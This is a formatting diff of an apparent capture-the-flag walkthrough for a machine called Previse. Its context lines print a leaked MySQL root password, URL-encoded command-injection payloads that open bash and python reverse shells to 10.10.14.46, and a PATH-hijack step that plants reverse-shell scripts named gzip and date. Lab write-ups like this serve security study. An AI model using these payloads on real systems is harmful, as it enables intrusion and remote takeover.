@@ -56,7 +56,7 @@ And then use it login as a user
 
 ### Get [backup](./site/backup) from [files.php](./site/backup/files.php)
 
-[Config.php](./site/backup/config.php)
+### [Config.php](./site/backup/config.php) View
 
 MySQL account
 
@@ -65,7 +65,7 @@ username: root
 password: mySQL_p@ssw0rd!:)
 ```
 
-[logs.php](./site/backup/logs.php)
+### [Logs.php](./site/backup/logs.php) View
 
 => Found it use python as an output process, not pure php
 
@@ -77,7 +77,7 @@ password: mySQL_p@ssw0rd!:)
 
 - Make sure convert to URL-encode format
 
-- The [bash approach](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)
+#### The [bash approach](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)
 
 *Origin*
 
@@ -87,7 +87,7 @@ password: mySQL_p@ssw0rd!:)
 
 > delim=comma%26%2Fbin%2Fbash%20-c%20%27bash%20-i%20%26%3E%20%2Fdev%2Ftcp%2F10.10.14.46%2F*port*%200%3E%261%27
 
-- The [python approach](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
+#### The [python approach](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
 
 *Origin*
 
@@ -97,7 +97,7 @@ password: mySQL_p@ssw0rd!:)
 
 > delim=comma%26python%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.10.14.46%22%2C*port*%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27
 
-- The [netcat approach](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional) (*Ensure victim has netcat to use*)
+#### The [netcat approach](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional) (*Ensure victim has netcat to use*)
 
 *Origin*
 
@@ -257,13 +257,13 @@ User m4lwhere may run the following commands on previse:
 
 ### Victim open port
 
-- Gzip approach
+#### Gzip approach
 
 > echo "bash -c 'bash -i &> /dev/tcp/10.10.14.46/*port* 0<&1'" > gzip
 
 > chmod +x gzip
 
-- Date approach
+#### Date approach
 
 > echo "bash -c 'bash -i &> /dev/tcp/10.10.14.46/*port* 0<&1'" > date
 
